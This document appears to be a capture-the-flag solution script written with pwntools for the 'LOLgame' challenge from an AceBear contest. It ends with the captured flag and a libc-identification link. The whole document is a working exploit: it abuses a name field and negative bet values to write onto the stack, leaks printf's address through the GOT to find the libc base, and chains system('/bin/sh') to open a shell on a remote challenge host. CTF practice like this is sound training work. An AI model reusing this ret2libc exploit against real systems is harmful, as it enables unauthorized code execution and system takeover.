from pwn import *
import time
import sys

def LOLgame(DEBUG):
	def showScore():
		r.sendline("2")
		return r.recvuntil("Your Choice:\n")
	
	def ChangeName(name):
		r.sendline("3")
		r.recvuntil("Enter your name: ")
		r.send(name)
		return r.recvuntil("Your Choice:\n")
	
	def Play(point):
		r.sendline("1")
		r.recvuntil("Enter Your Bet Point: ")
		r.sendline(str(point))
		r.sendline("1")
		r.sendline("1")
		r.sendline("2")
		r.sendline("2")
		r.sendline("3")
		r.sendline("3")
		return r.recvuntil("Your Choice:\n")
	
	def write(offset, value):
		log.info('write at %d value %#x' % (offset, value))
		ChangeName("A"*0x10+chr(offset))
		Play(-value)
		
	def Exit():
		r.sendline("4")
		
	if DEBUG=="1":
		offset_printf = 0x00049670
		offset_system = 0x0003ada0
		offset_str_bin_sh = 0x15ba0b
		r = process("./LOLgame")
		raw_input("debug?")
	elif DEBUG=="2":
		offset_system = 0x0003a900
		offset_str_bin_sh = 0x15d00f
		offset_printf = 0x00049880
		HOST = 'lolgame.acebear.site'
		PORT = 3004
		r = remote(HOST,PORT)
	
	printf_plt = 0x080483C0 
	puts_plt = 0x080483D0
	puts_got = 0x0804910C
	printf_got = 0x08049108
	__libc_start_main_got = 0x08049110
	main = 0x08048A2A
	ret = 0x08048B72 
	bye = 0x08048B59 
	
	name = "A"*0x10
	name += chr(0x35)
	r.recvuntil("Enter your name: ")
	r.send(name)	
	
	write(0x39, printf_plt)
	write(0x3a, main)
	write(0x3b, printf_got)
	Exit()
	r.recvuntil("Bye!")
	printf = u32(r.recv(4))
	log.info('printf: %#x' % printf)
	baselibc = printf - offset_printf
	system = baselibc + offset_system
	str_bin_sh = baselibc + offset_str_bin_sh
	log.info('baselibc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('str_bin_sh: %#x' % str_bin_sh)
	
	name = "A"*0x10
	name += chr(0x35)
	r.recvuntil("Enter your name: ")
	r.send(name)	
	write(0x37, system)
	write(0x38, main)
	write(0x39, str_bin_sh)
	
	raw_input("?")
	Exit()
	
	r.interactive()

LOLgame(sys.argv[1])
# AceBear{tH4_r00t_1s_pr0gr4m_l3u7_u_are_hum4n}
# https://libc.blukat.me/?q=puts%3A0xf7e69940%2C__libc_start_main%3A0xf7d74180%2Cprintf%3A0xf7dfb880&l=libc6-i386_2.24-9ubuntu2.2_amd64